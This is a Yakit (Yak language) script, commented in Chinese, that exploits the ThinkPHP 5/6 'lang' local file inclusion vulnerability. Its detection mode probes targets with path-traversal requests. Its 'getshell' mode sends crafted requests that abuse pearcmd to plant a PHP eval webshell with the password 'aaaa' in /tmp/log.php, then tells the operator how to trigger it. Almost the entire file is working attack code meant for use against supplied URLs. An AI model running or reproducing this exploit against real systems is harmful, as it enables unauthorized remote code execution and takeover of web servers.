log.setLevel("info")  // 设置日志级别

yakit.AutoInitYakit()
// 编写核心发包函数

sendWriteShellPacketTP5 = func(target) {
    //知道根目录路径也可以直接写到跟目录
    return poc.HTTP(`GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST['aaaa']);?>+/tmp/log.php HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Length: 0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0`,
        poc.params({
            "target": target
        })
    )
}

sendWriteShellPacketTP6 = func(target) {
    //知道根目录路径也可以直接写到跟目录
    return poc.HTTP(`GET /public/index.php?+config-create+/<?=@eval($_POST['aaaa']);?>+/tmp/log.php HTTP/1.1
Host: {{params(target)}}
think-lang: ../../../../../../../../usr/local/lib/php/pearcmd
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Length: 0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0`,
        poc.params({
            "target": target
        })
    )
}


//yakit输出信息 10%
yakit.SetProgress(0.1)
yakit.Info("开始接收参数")

targeturl = cli.String("url")
if targeturl == "" {
    die("no targeturl")
}
host,port,err = str.ParseStringToHostPort(targeturl)
target = sprintf("%v:%v", host, port)

getshell = false
getshell = cli.Bool("getshell")
yakit.Info("getshell button is:" + string(getshell))
//yakit输出信息 20%
yakit.SetProgress(0.2)
yakit.Info("接收参数成功")

switch  {
    case getshell:
        println("getshell模式")
        yakit.Info("一键getshell模式")
        //yakit输出信息 30%
        yakit.SetProgress(0.3)

        yakit.Info("准备发送数据包")

        //判断是否需要添加/public/
        resp, err := http.Get(targeturl)
        if err != nil {
                println("发送失败")
                log.error("发送数据包失败: %v", targeturl)
                yakit.Error("发送数据包失败: %v", targeturl)
                yakit.SetProgress(1)
                die(err)
            }

        if resp.StatusCode == 200{
            rsp, _, err = sendWriteShellPacketTP5(target)
            yakit.SetProgress(0.5)

            if err != nil {
                println("发送失败")
                log.error("发送数据包失败: %v", target)
                yakit.Error("发送数据包失败: %v", target)
                yakit.SetProgress(1)
                die(err)
            }
                headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
                result = str.MatchAllOfRegexp(body, "CONFIGURATION","pear")
                if result {
                    println("matched")
                    yakit.Info("写入木马成功，密码aaaa，请访问index.php并携带文件包含参数lang: ../../../../../../../../tmp/log.php")
                    yakit.StatusCard("写入木马成功", target)
                    yakit.SetProgress(1)
                    } else {
                        yakit.Error("写入木马失败")
                        yakit.SetProgress(1)
                    }
        } else{
            rsp, _, err = sendWriteShellPacketTP6(target)
            yakit.SetProgress(0.5)
            if err != nil {
                println("发送失败")
                log.error("发送数据包失败: %v", target)
                yakit.Error("发送数据包失败: %v", target)
                yakit.SetProgress(1)
                die(err)
            }

            headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
            result = str.MatchAllOfRegexp(body, "CONFIGURATION","pear")
            if result {
                println("matched")
                yakit.Info("写入木马成功，密码aaaa，请访问index.php并包含../../../../../../../../tmp/log.php")
                yakit.Info("包含方式：lang(GET)、think-lang(Headers)、think_lang(Cookie)")
                yakit.StatusCard("写入木马成功", target)
                yakit.SetProgress(1)
            } else {
                yakit.Error("写入木马失败")
                yakit.SetProgress(1)
            }
        }



    /*case command != "":
        println("command模式")
        //yakit输出信息 30%
        yakit.SetProgress(0.3)
        yakit.Info("开始生成Payload")

        //yakit输出信息 50%
        yakit.SetProgress(0.5)
        yakit.Info("准备发送数据包")

        // 使用生成的命令发包
        rsp, _, err = sendPacket(target, command)
        if err != nil {
            log.error("发送数据包失败: %v %v", target,command)
            yakit.Error("发送数据包失败: %v %v", target,command)
            yakit.SetProgress(1)
            die(err)
        }

        //yakit输出信息  90%
        yakit.Info("准备检测结果")
        yakit.SetProgress(0.9)

        time.sleep(1)

        // 取出发送的数据包中的结果，检测内容
        headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
        if body != "" {
            yakit.Info("%v",string(body))
            log.info("%v",string(body))
        }else{
            yakit.Error("命令执行失败")
            log.error("命令执行失败")
        }*/

    default:
        println("poc模式")
        //yakit输出信息 30%
        yakit.SetProgress(0.3)
        yakit.Info("POC检测模式")
        yakit.Info("准备发送数据包")

        yakit.Info("验证TP6 POC ......")
        rsp, err = http.Get(targeturl + `/public/?lang=../../../../../vendor/composer/autoload_static`)
        if err != nil {
                println("发送失败")
                log.error("发送数据包失败: %v", targeturl)
                yakit.Error("发送数据包失败: %v", targeturl)
                yakit.SetProgress(1)
                die(err)
            }

        resp, err = http.dump(rsp) 
        if (rsp.StatusCode == 500) && str.MatchAllOfRegexp(string(resp), "#f7f7f7"){
            rsp1, err = http.Get(targeturl + `/public/?lang=../../../../../vendor/composer/autoload_static_bak`)
            if err != nil {
                println("发送失败")
                log.error("发送数据包失败: %v", targeturl)
                yakit.Error("发送数据包失败: %v", targeturl)
                yakit.SetProgress(1)
                die(err)
            }

            if (rsp1.StatusCode == 200){
                println("存在TP6 thinkphp lang LFI漏洞")
                yakit.Info("存在TP6 thinkphp lang LFI漏洞，请尝试一键getshell！")
                yakit.StatusCard("存在thinkphp_lang_LFI漏洞", targeturl)
                yakit.SetProgress(1)
                break
            }else{
                yakit.Error("%v不存在TP6 thinkphp lang LFI漏洞, 尝试TP5 POC中...", targeturl)
                println("不存在 thinkphp lang LFI漏洞")
            }
        }else{
            yakit.Error("%v不存在TP6 thinkphp lang LFI漏洞, 尝试TP5 POC中...", targeturl)
            println("不存在 thinkphp lang LFI漏洞")
        }

        //yakit输出信息 50%
        yakit.SetProgress(0.5)

        yakit.Info("验证TP5 POC ......")
        rsp, err = http.Get(targeturl + `/?lang=../../thinkphp/base`)
        if err != nil {
                println("发送失败")
                log.error("发送数据包失败: %v", targeturl)
                yakit.Error("发送数据包失败: %v", targeturl)
                yakit.SetProgress(1)
                die(err)
            }

        resp, err = http.dump(rsp) 
        if (rsp.StatusCode == 500) && str.MatchAllOfRegexp(string(resp), "#f7f7f7"){
            rsp1, err = http.Get(targeturl + `/?lan=../../thinkphp/base`)
            if err != nil {
                println("发送失败")
                log.error("发送数据包失败: %v", targeturl)
                yakit.Error("发送数据包失败: %v", targeturl)
                yakit.SetProgress(1)
                die(err)
            }

            if (rsp1.StatusCode == 200){
                yakit.Info("TP5 POC检测发现%v存在thinkphp lang rce漏洞，请尝试一键getshell模块！", targeturl)
                yakit.StatusCard("存在thinkphp_lang_LFI漏洞", targeturl)
                println("存在thinkphp_lang_LFI漏洞")
                yakit.SetProgress(1)
                break
            }else{
                yakit.Error("%v不存在TP5 thinkphp lang LFI漏洞", targeturl)
                yakit.SetProgress(1)
                println("不存在 thinkphp_lang_LFI 漏洞")
            }
        }else{
            yakit.Error("%v不存在TP5 thinkphp lang LFI漏洞", targeturl)
            println("不存在 thinkphp_lang_LFI 漏洞")
            yakit.SetProgress(1)
        }

}
